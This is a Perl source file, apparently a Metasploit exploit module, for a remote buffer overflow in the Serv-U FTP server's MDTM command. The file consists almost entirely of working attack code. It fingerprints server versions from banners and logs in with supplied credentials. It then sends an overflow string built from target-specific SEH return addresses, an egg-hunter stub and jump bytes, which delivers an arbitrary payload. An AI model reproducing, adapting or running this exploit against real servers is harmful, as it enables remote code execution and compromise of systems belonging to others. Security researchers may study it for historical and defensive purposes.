package Msf::Exploit::servu_mdtm_overflow;

use base "Msf::Exploit";
use strict;
use Pex::Searcher;
use Pex::x86;
use Pex::Utils;

my $advanced = {
  'SEHOffset'       => ['47', 'Offset from beginning of timezone to SEH'],
  'ForceDoubling'   => ['2', '1 to force \xff doubling for 4.0.0.4, 0 to disable it, 2 to autodetect'],
};
my $info =
{
  'Name'  => 'Serv-U FTPD MDTM Overflow',
  'Version'  => '$Revision: 1.20 $',
  'Authors' =>
    [
      'spoonm <ninjatools [at] hush.com>',
      'Basic vector from: Servu2.c lion <lion [at] cnhonker.net>',
    ],
  'Description'  => qq{
      This is a exploit for Serv-U's MDTM command.
      It has been tested against versions 4.0.0.4/4.1.0.0/4.1.0.3/5.0.0.0 with
      success (against nt4/2k/xp/2k3). The bug was fixed in version 5.0.0.4.
      The bug exists in versions older than 4, but this exploit will not exploit it.
      You only get one shot, but we jump into exe so it should be OS/SP independent.
  },
  
  'Arch'  => [ 'x86' ],
  'OS'    => [ 'win32' ],
  'Priv'  => 0,
  'UserOpts'  =>
    {
      'RHOST' => [1, 'ADDR', 'The target address'],
      'RPORT' => [1, 'PORT', 'The target port', 21],
      'SSL'   => [0, 'BOOL', 'Use SSL'],
      'USER'  => [1, 'DATA', 'Username', 'ftp'],
      'PASS'  => [1, 'DATA', 'Password', 'ftp'],
    },

  'Payload' =>
    {
      'Space'  => 1000,
      'BadChars'  => "\x00~+&=%\x3a\x22\x0a\x0d\x20\x2f\x5c\x2e",
      'MinNops' => 0,
      'MaxNops' => 0,
    },
  'Nop' =>
    {
      'ModStack' => 0, # We don't use nops, but if we did...
    },

  'Refs'  => 
    [  
      'http://www.osvdb.org/4073',
      'http://archives.neohapsis.com/archives/bugtraq/2004-02/0654.html',
      'http://www.cnhonker.com/advisory/serv-u.mdtm.txt',
      'http://www.cnhonker.com/index.php?module=releases&act=view&type=3&id=54',
    ],
  'DefaultTarget' => 0,
  'Targets' =>
    [
      ['Serv-U Uber-Leet Universal ServUDaemon.exe', 0x00401877],
      ['Serv-U 4.0.0.4/4.1.0.0/4.1.0.3 ServUDaemon.exe', 0x0040164d],
      ['Serv-U 5.0.0.0 ServUDaemon.exe', 0x0040167e],
    ],
};


# From 5.0.0.4 Change Log
# "* Fixed bug in MDTM command that potentially caused the daemon to crash."
#
# Nice way to play it down boys
#
# Connected to ftp2.rhinosoft.com.
# 220 ProFTPD 1.2.5rc1 Server (ftp2.rhinosoft.com) [62.116.5.74]
#
# Heh :)

sub new {
  my $class = shift;
  my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
  return($self);
}

sub Check {
  my $self = shift;
  my $targetHost  = $self->GetVar('RHOST');
  my $targetPort  = $self->GetVar('RPORT');

  my $s = Msf::Socket->new();

  if(!$s->Tcp($targetHost, $targetPort) || $s->IsError) {
    $s->PrintError;
    return;
  }

  my $r;

  $r = $self->response($s);
  goto NORESP if(!$r);
  if($r =~ /Serv-U FTP Server v4\.1/) {
    $self->PrintLine('[*] Found version 4.1.0.3, exploitable.');
    return(1);
  }
  elsif($r =~ /Serv-U FTP Server v5\.0/) {
    $self->PrintLine('[*] Found version 5.0.0.0 (exploitable) or 5.0.0.4 (not), try it!');
    return(1);
  }
  elsif($r =~ /Serv-U FTP Server v4\.0/) {
    $self->PrintLine('[*] Found version 4.0.0.4 or 4.1.0.0, additional check.');
  }
  elsif($r =~ /Serv-U FTP Server/) {
    $self->PrintLine('[*] Looks like Serv-U, but not a version I know.');
    return(1);
  }
  else {
    $self->PrintLine('[*] Banner doesn\'t look like Serv-U, possible it still is.');
    return(0);
  }

  $s->Send("USER " . $self->GetLocal('USER') . "\r\n");
  goto NORESP if(!$self->response($s));
 
  $s->Send("PASS " . $self->GetLocal('PASS') . "\r\n");
  goto NORESP if(!$self->response($s));

  $s->Send("P\@SW\r\n");
  $r = $self->response($s);
  goto NORESP if(!$r);

  if($r =~ /500/) {
    $self->PrintLine('[*] Found version 4.0.0.4, exploitable');
    return(1);
  }
  else {
    $self->PrintLine('[*] Found version 4.1.0.0, exploitable');
    return(1);
  }

  # quit is for losers, exiting uncleanly rocks.
  return(0);

# dirty
NORESP:
  $self->PrintLine('[*] No response from FTP server');
  return;
}


sub Exploit {
  my $self = shift;
  my $targetHost  = $self->GetVar('RHOST');
  my $targetPort  = $self->GetVar('RPORT');
  my $targetIndex = $self->GetVar('TARGET');
  my $shellcode   = $self->GetVar('EncodedPayload')->Payload;
  my $sehOffset   = $self->GetLocal('SEHOffset');

  my $s = Msf::Socket->new();

  if(!$s->Tcp($targetHost, $targetPort) || $s->IsError) {
    $s->PrintError;
    return;
  }

  my $r;

  $r = $self->response($s);
  goto NORESP if(!$r);
#  $targetIndex = 1 if(!$targetIndex && $r =~ /v4\.1/);
#  $targetIndex = 1 if(!$targetIndex && $r =~ /v5\.0/);
    
  $s->Send("USER " . $self->GetLocal('USER') . "\r\n");
  goto NORESP if(!$self->response($s));
 
  $s->Send("PASS " . $self->GetLocal('PASS') . "\r\n");
  goto NORESP if(!$self->response($s));


# Autodetect no more

#  if(!$targetIndex) {
#    $s->Send("P\@SW\r\n");
#    $r = $self->response($s);
#    goto NORESP if(!$r);
#
#    $targetIndex = $r =~ /500/ ? 1 : 1;
#  }

  # Should have paid more attention to skylined's exploit, only after figuring
  # out how my payloads were getting transformed did I remember seeing \xff
  # doubling in his CHMOD exploit, arg!
  if($self->GetLocal('ForceDoubling') == 1) {
    $self->PrintLine('[*] ForceDoubling enabled, enabling \xff doubling.');
    $shellcode = xffDoubler($shellcode);
  }
  elsif($self->GetLocal('ForceDoubling') == 0) {
    $self->PrintLine('[*] ForceDoubling disabled, disabling \xff doubling.');
  }
  else {
    $s->Send("P\@SW\r\n");
    $r = $self->response($s);
    goto NORESP if(!$r);
    if($r =~ /^500/) {
      $self->PrintLine('[*] Serv-U 4.0.0.4 detected, enabling \xff doubling.');
      $shellcode = xffDoubler($shellcode);
    }
  }


  my $target = $self->Targets->[$targetIndex];
  $self->PrintLine('[*] Trying to exploit target ' . $target->[0]);


  my $searcher = Pex::Searcher->new("\x34\x33\x32\x31");

  # Searcher expects address to start scanning at in edi
  # Since we got here via a pop pop ret, we can just the address of the jmp
  # off the stack, add esp, BYTE -4 ; pop edi
  my $searchCode = "\x83\xc4\xfc\x5f" . $searcher->Searcher . 'BB';

  if($sehOffset < length($searchCode)) {
    $self->PrintLine('[*] Not enough room for search code.');
    return;
  }

  my $jmpBack = Pex::x86::JmpShort('$+' . (-1 * length($searchCode))) . 'BB';
#  $jmpBack = "\xcc\xcc\xcc\xcc";

  my $command = 'MDTM 20031111111111+' . ('A' x ($sehOffset - length($searchCode)));
  $command .= $searchCode;
  $command .= $jmpBack . pack('V', $target->[1]);
  $command .= ' /' . $searcher->StartTag . $shellcode .  $searcher->EndTag . "\r\n";

  $s->Send($command);

  $r = $self->response($s, 2);
  if($r) {
    $self->PrintLine('[*] Received data back from server, not a good sign, maybe newer than 5.0.0.0?');
  }

  $self->Handler($s);
  return;

# dirty
NORESP:
  $self->PrintLine('[*] No response from FTP server');
  return;
}

sub response {
  my $self = shift;
  my $sock = shift;
  my $r;
  if(@_) {
    my $timeout = shift;
    $r = $sock->Recv(-1, $timeout);
  }
  else {
    $r = $sock->Recv(-1);
  }
  chomp($r);
  $r =~ s/\r//g;
  $self->PrintLine("[*] REMOTE> $r") if($r);
  return($r);
}

# Serv-U is dumb. Doubling for 4.0.0.4
sub xffDoubler {
  my $payload = shift;
  $payload =~ s/\xff/\xff\xff/g;
  return($payload);
}


